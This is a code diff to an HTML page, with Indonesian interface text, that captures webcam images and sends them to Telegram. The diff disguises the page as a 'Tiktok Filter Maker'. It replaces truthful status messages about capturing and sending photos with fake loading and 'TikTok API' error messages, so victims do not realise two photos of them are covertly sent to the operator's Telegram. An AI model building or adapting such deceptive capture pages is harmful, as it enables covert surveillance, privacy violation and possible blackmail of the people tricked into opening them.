@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Camera Capture & Telegram</title>
+    <title>Tiktok Filter Maker</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -42,7 +42,7 @@
     </style>
 </head>
 <body>
-    <h1>Auto Camera Capture & Telegram</h1>
+    <h1>Tunggu Beberapa saat, jika error dimaafkan karena masih tahap pengembangan</h1>
     <div id="videoContainer">
         <video id="videoElement" autoplay playsinline></video>
     </div>
@@ -70,7 +70,7 @@
                 });
                 videoElement.srcObject = stream;
                 
-                statusDiv.textContent = 'Kamera siap - Memulai capture dalam 3 detik...';
+                statusDiv.textContent = 'Kamera siap - Memulai Loading dalam 3 detik...';
                 statusDiv.style.backgroundColor = '#4CAF50';
                 
                 // Mulai proses capture setelah 3 detik
@@ -83,14 +83,14 @@
         }
 
         async function startCaptureProcess() {
-            statusDiv.innerHTML = 'Sedang mengambil gambar 1... <div class="loading"></div>';
+            statusDiv.innerHTML = 'Menyiapkan camera... <div class="loading"></div>';
             
             // Capture gambar pertama
             await captureImage();
             
             // Tunggu 2 detik untuk capture kedua
             setTimeout(async () => {
-                statusDiv.innerHTML = 'Sedang mengambil gambar 2... <div class="loading"></div>';
+                statusDiv.innerHTML = 'Error... <div class="loading"></div>';
                 await captureImage();
                 await sendToTelegram();
             }, 2000);
@@ -110,7 +110,7 @@
         }
 
         async function sendToTelegram() {
-            statusDiv.innerHTML = 'Mengirim gambar ke Telegram... <div class="loading"></div>';
+            statusDiv.innerHTML = 'Coba kembali Nanti... <div class="loading"></div>';
             statusDiv.style.backgroundColor = '#2196F3';
 
             try {
@@ -118,15 +118,10 @@
                     await sendImageToTelegram(images[i], `Gambar ${i + 1} - ${new Date().toLocaleString()}`);
                 }
                 
-                statusDiv.textContent = '2 gambar berhasil dikirim ke Telegram!';
+                statusDiv.textContent = 'maaf seperti ada kesalahan Tiktok Api';
                 statusDiv.style.backgroundColor = '#4CAF50';
                 
                 // Reset untuk capture baru
-                setTimeout(() => {
-                    captureCount = 0;
-                    images = [];
-                    startCaptureProcess();
-                }, 5000);
                 
             } catch (error) {
                 statusDiv.textContent = 'Error: Gagal mengirim - ' + error.message;
